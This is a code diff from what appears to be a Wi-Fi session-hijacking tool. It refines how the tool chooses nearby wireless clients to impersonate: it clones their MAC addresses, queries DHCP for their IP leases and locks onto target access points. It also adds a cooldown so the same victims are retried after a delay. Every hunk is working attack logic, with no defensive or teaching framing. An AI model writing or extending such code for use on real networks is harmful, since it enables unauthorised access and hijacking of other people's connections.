@@ -49,11 +49,12 @@ def sort_clients_by_activity(clients_dict: dict, air_clients_map: dict | None = 
 
 def filter_valid_air_clients(
     bssid_air_clients: dict,
-    tried_macs: set,
+    tried_macs: set | dict,
     auto_params: dict,
     bssids: list,
     air_clients_map: dict | None = None,
-    active_only: bool = False
+    active_only: bool = False,
+    cooldown_seconds: float = 150.0
 ) -> dict:
     gw_mac_clean = (auto_params.get("gateway_mac") or "").lower()
     local_mac_clean = (auto_params.get("local_mac") or "").lower()
@@ -61,7 +62,14 @@ def filter_valid_air_clients(
     blacklist = load_blacklist()
 
     def is_valid_client(m_clean):
-        if m_clean in tried_macs or m_clean in all_bssids_clean or m_clean == gw_mac_clean or m_clean == local_mac_clean:
+        if isinstance(tried_macs, dict):
+            last_tried = tried_macs.get(m_clean)
+            if last_tried is not None and (time.time() - last_tried) < cooldown_seconds:
+                return False
+        elif m_clean in tried_macs:
+            return False
+
+        if m_clean in all_bssids_clean or m_clean == gw_mac_clean or m_clean == local_mac_clean:
             return False
         if is_blacklisted(m_clean, blacklist):
             return False
@@ -97,6 +105,7 @@ def filter_valid_air_clients(
         if is_valid_client(mac.lower())
     }
     return sort_clients_by_activity(filtered, air_clients_map=air_clients_map or bssid_air_clients)
+
 
 
 def test_air_client_targets(
@@ -165,7 +174,10 @@ def test_air_client_targets(
         try:
             if is_blacklisted(client_mac, blacklist):
                 continue
-            tried_macs.add(client_mac.lower())
+            if isinstance(tried_macs, dict):
+                tried_macs[client_mac.lower()] = time.time()
+            elif hasattr(tried_macs, "add"):
+                tried_macs.add(client_mac.lower())
             is_active = is_client_active(client_mac, air_clients_map)
             active_tag = " [ACTIVE DATA SESSION]" if is_active else ""
 
@@ -192,7 +204,7 @@ def test_air_client_targets(
                     set_hijack_status(ip=None, mac=client_mac, technique="DHCP Lease Query")
                     set_mac_address(interface, client_mac, profile=profile)
                     if not wait_for_carrier(interface, timeout=6.0):
-                        lock_bssid(target_bssid, profile)
+                        lock_bssid(target_bssid, profile, any_bssid=any_bssid_mode)
                         wait_for_carrier(interface, timeout=6.0)
                     resolved_ip = query_dhcp_lease_ip(interface, target_mac=client_mac)
 
@@ -210,7 +222,7 @@ def test_air_client_targets(
                     set_hijack_status(ip=None, mac=client_mac, technique=tech_fb)
 
             if not wait_for_carrier(interface, timeout=6.0):
-                lock_bssid(target_bssid, profile)
+                lock_bssid(target_bssid, profile, any_bssid=any_bssid_mode)
                 wait_for_carrier(interface, timeout=6.0)
 
             log_hijack_attempt(target_ip, client_mac)
